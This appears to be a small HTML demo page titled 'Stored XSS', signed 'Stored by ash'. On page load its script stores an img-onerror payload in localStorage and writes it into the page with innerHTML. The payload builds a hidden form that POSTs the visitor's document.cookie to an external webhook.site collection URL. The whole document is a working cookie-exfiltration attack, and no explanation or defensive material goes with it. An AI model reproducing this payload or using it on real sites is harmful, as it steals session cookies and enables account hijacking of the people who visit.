<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Stored XSS </title>
    <script>
        
        function storePayload() {
            var payload = `
                <img src="x" onerror="
                    var form = document.createElement('form');
                    form.method = 'POST';
                    form.action = 'https://webhook.site/8cfff3aa-33a7-44d3-9de1-86fd29b0967b/receive-cookies';
                    form.style.display = 'none';
                    
                    var input = document.createElement('input');
                    input.type = 'hidden';
                    input.name = 'cookie';
                    input.value = document.cookie;

                    form.appendChild(input);
                    document.body.appendChild(form);
                    form.submit();
                ">
            `;
            localStorage.setItem('xssPayload', payload);
        }

        
        function executePayload() {
            var payload = localStorage.getItem('xssPayload');
            if (payload) {
                var container = document.getElementById('payloadContainer');
                container.innerHTML = payload;
            }
        }

        document.addEventListener('DOMContentLoaded', function() {
            storePayload(); 
            executePayload(); 
        });
    </script>
</head>
<body>
    <h1>Stored by ash</h1>
    <div id="payloadContainer"></div>
</body>
</html>
